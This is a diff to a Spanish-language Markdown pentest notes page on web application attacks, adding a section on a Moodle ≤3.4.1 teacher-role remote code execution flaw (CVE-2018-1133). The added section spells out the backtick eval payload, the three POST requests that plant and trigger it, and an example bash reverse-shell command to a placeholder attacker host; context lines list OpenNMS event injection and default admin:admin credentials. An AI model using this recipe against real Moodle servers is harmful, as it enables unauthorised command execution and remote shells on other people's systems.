@@ -2,9 +2,9 @@
 title: Web Application Attacks
 slug: web-app-attacks
 category: techniques
-updated: 2026-07-15
-summary: "VHost fuzzing, SQLi, LFI, upload bypass, OFBiz/NextJS/OpenNMS CVEs, Docker creds"
-tags: [web, sqli, lfi, upload, vhost, rce, nextjs, opennms, cms, ssrf, oob, collaborator]
+updated: 2026-08-02
+summary: "VHost fuzzing, SQLi, LFI, upload bypass, OFBiz/NextJS/OpenNMS/Moodle CVEs, Docker creds"
+tags: [web, sqli, lfi, upload, vhost, rce, nextjs, opennms, moodle, cms, ssrf, oob, collaborator]
 sensitive: false
 ---
 
@@ -128,6 +128,25 @@ curl -s -b SESSION_COOKIE \
   </event>' "http://TARGET/opennms/rest/events"
 # Credenciales default a probar: admin:admin
 ```
+
+### Moodle ≤ 3.4.1 Teacher RCE (CVE-2018-1133)
+**Requisito**: credenciales de rol Teacher (o superior) en cualquier curso.
+```
+# Payload en answer[0] del wizard de "calculated question":
+answer[0] = " /*{a*/`$_GET[0]`;//{x}}"
+# El evaluador de fórmulas llama eval() que hace backtick → RCE como www-data
+```
+Flujo (wizard de 3 pasos — datasetdefinitions → datasetitems):
+1. **Step 1** — POST `/question/question.php` con `wizard=datasetdefinitions` + `_qf__qtype_calculated_edit_form=1` → crea la pregunta, guarda el payload, retorna `id=QID` en el Location.
+2. **Step 2** — POST con `wizardnow=datasetdefinitions` + `_qf__question_dataset_dependent_definitions_form=1` + `dataset[0]=1-0-x` → avanza el wizard.
+3. **Trigger** — POST con `wizardnow=datasetitems` + `0=(CMD)` en params → ejecuta `CMD` en el GET[0] del backtick.
+
+```python
+# Payload GET param que activa ejecución (paso 3):
+params = {"wizardnow": "datasetitems", "0": "(COMANDO)"}
+# COMANDO ejemplo: bash -c 'bash -i >& /dev/tcp/KALI/PORT 0>&1 &'
+```
+**Gotcha**: el output del comando NO se refleja en HTTP — usar reverse shell OOB. El sesskey se renueva por petición; re-extraerlo antes del trigger. CMID (course module ID) del quiz + QID de la pregunta deben ser consistentes en los 3 pasos.
 
 ### WordPress
 ```bash
